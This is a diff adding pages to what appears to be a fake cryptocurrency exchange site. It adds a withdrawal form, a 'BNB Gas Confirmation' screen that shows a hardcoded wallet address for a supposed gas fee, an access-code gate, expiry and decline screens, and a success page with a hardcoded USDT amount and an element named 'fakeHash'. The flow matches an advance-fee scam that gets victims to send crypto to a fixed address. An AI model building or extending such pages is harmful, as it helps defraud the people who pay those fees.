@@ -377,6 +377,108 @@
       </div>
     </div>
   </section>
+  <section id="page8" class="page min-h-screen flex flex-col items-center justify-center bg-[#0b0e11] text-white px-6 pt-20">
+    <div>
+        <button type="button" onclick="showPage('page0')" class="w-full bg-[#333a4b] text-yellow-400 font-semibold py-3 rounded hover:bg-[#444f65] transition">
+          ⬅ Back
+        </button>
+    </div><div class="w-full max-w-md bg-[#1e2329] rounded-2xl p-8 shadow-lg">
+      <h2 class="text-2xl font-bold text-yellow-400 mb-8 text-center">Send Funds</h2>
+      <label for="inputWallet" class="block text-sm mb-2 font-semibold">Recipient Wallet Address</label>
+      <input id="inputWallet" type="text" placeholder="0x1234...abcd" class="w-full mb-6 p-3 rounded bg-[#111820] border border-[#333a4b] focus:outline-none focus:border-yellow-400 text-sm font-semibold" />
+      <label for="networkSelect" class="block text-sm mb-2 font-semibold">Select Network</label>
+      <select id="networkSelect" class="w-full mb-6 p-3 rounded bg-[#111820] border border-[#333a4b] focus:outline-none focus:border-yellow-400 text-sm font-semibold">
+        <option value="" disabled selected>Select Network</option>
+        <option value="Ethereum">Ethereum</option>
+        <option value="Binance Smart Chain">Binance Smart Chain</option>
+      </select>
+      <label for="transferAmount" class="block text-sm mb-2 font-semibold">Amount</label>
+      <div class="flex gap-2 mb-6">
+        <input id="transferAmount" type="number" min="0" step="any" placeholder="Enter amount" class="flex-grow p-3 rounded bg-[#111820] border border-[#333a4b] focus:outline-none focus:border-yellow-400 text-sm font-semibold" />
+        <button type="button" class="px-4 py-3 bg-yellow-400 text-black font-bold rounded hover:bg-yellow-300 transition" onclick="setMaxAmount()">
+          Max
+        </button>
+      </div>
+      <div class="flex justify-between text-yellow-400 font-bold mb-8">
+        <span>Gas Fee:</span>
+        <span id="gasFee">0.0600 BNB</span>
+      </div>
+      <div>
+        <button type="button" onclick="showPage('page9i')" class="w-full bg-yellow-400 text-black font-bold py-3 rounded hover:bg-yellow-300 transition mb-4">
+          Confirm Withdrawal
+        </button>
+      </div>
+    </div>
+  </section>
+
+  <section id="page8iii" class="page min-h-screen flex items-center justify-center bg-[#0b0e11] text-white px-6 pt-20">
+    <div class="text-center max-w-md">
+      <h2 class="text-3xl font-bold text-red-500 mb-4">⏰ Time Expired</h2>
+      <p class="mb-6 text-lg">Your withdrawal session has expired after 48 hours.</p>
+      <button onclick="showPage('page0')" class="bg-yellow-400 text-black font-bold py-3 px-6 rounded hover:bg-yellow-300 transition">
+        Back to Dashboard 
+      </button>
+    </div>
+  </section>
+
+  <section id="page9" class="page min-h-screen flex items-center justify-center bg-[#0b0e11] text-white px-4 transition-opacity duration-300 pt-20">
+    <div class="flex flex-col items-center">
+      <div class="loader mb-6"></div>
+      <p class="text-xl font-semibold text-yellow-400 mb-2">Processing Transaction</p>
+      <p class="text-sm text-gray-400">Please wait while we process your transaction...</p>
+    </div>
+  </section>
+
+  <section id="page9i" class="page min-h-screen flex items-center justify-center bg-[#0b0e11] text-white px-4 transition-opacity duration-300 pt-20">
+    <div class="w-full max-w-md bg-[#10151c] p-6 rounded-xl shadow-xl">
+      <h2 class="text-xl font-bold text-yellow-400 mb-4">BNB Gas Confirmation</h2>
+      <p class="text-sm text-gray-300 mb-4">Please confirm your BNB gas fee address:</p>
+      <div class="flex items-center justify-between bg-[#1c232b] p-3 rounded mb-4">
+        <span id="bnbAddress" class="truncate">0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130</span>
+        <button onclick="copyBNBAddress()" class="text-yellow-400 hover:underline text-sm">Copy</button>
+      </div>
+      <div>
+        <button type="button" onclick="showPage('page0')" class="w-full bg-[#333a4b] text-yellow-400 font-semibold py-3 rounded hover:bg-[#444f65] transition">
+          ⬅ Back
+        </button>
+      </div>
+      <div class="mt-4">
+        <button onclick="showPage('page9ii')" class="w-full bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-2 rounded">Confirm BNB Gas Code</button>
+      </div>
+    </div>
+  </section>
+
+  <section id="page9ii" class="page min-h-screen flex items-center justify-center bg-[#0b0e11] text-white px-4 transition-opacity duration-300 pt-20">
+    <div class="w-full max-w-md bg-[#10151c] p-6 rounded-xl shadow-xl text-center">
+      <h2 class="text-xl font-bold text-yellow-400 mb-4">Access Code Required</h2>
+      <canvas id="accessQr" class="mx-auto mb-4"></canvas>
+      <p class="text-sm text-gray-400 mb-2">Scan the code or enter the access code below:</p>
+      <input id="accessCodeInput" placeholder="Enter access code" class="w-full mb-4 p-3 rounded bg-[#1c232b] border border-gray-600 text-white text-center">
+      <button onclick="verifyAccessCode()" class="w-full bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-2 rounded">Submit Code</button>
+      <div class="mt-4">
+        <button type="button" onclick="showPage('page0')" class="w-full bg-[#333a4b] text-yellow-400 font-semibold py-3 rounded hover:bg-[#444f65] transition">
+          ⬅ Back
+        </button>
+      </div>
+    </div>
+  </section>
+
+  <section id="page11" class="page min-h-screen flex items-center justify-center bg-[#0b0e11] text-white px-4 transition-opacity duration-300 pt-20">
+    <div class="text-center">
+      <h2 class="text-2xl font-bold text-red-500 mb-4">Transaction Declined</h2>
+      <p class="text-sm text-gray-400 mb-6">Access code was incorrect. Please try again or contact support.</p>
+      <button onclick="showPage('page9ii')" class="bg-yellow-500 text-black font-bold py-2 px-4 rounded">Try Again</button>
+    </div>
+  </section>
+
+  <section id="page14" class="page min-h-screen flex items-center justify-center bg-[#0b0e11] text-white px-4 transition-opacity duration-300 pt-20">
+    <div class="text-center max-w-md">
+      <h2 class="text-2xl font-bold text-green-500 mb-4">✅ Transfer Successful</h2>
+      <p class="text-sm text-gray-300 mb-2">Amount Transferred: <span class="text-yellow-400 font-semibold">$3,078.78 USDT</span></p>
+      <p class="text-sm text-gray-300">Transaction Hash:</p>
+      <p id="fakeHash" class="text-xs text-gray-400 mt-1 cursor-pointer hover:text-yellow-400">0xa3e...d5f9b<span></span></p>
+    </div>
+  </section>
 
   <section id="page10" class="page min-h-screen flex flex-col justify-between px-4 py-6 bg-[#1E2329] text-white pt-20 hidden">
     <div class="max-w-md mx-auto w-full">
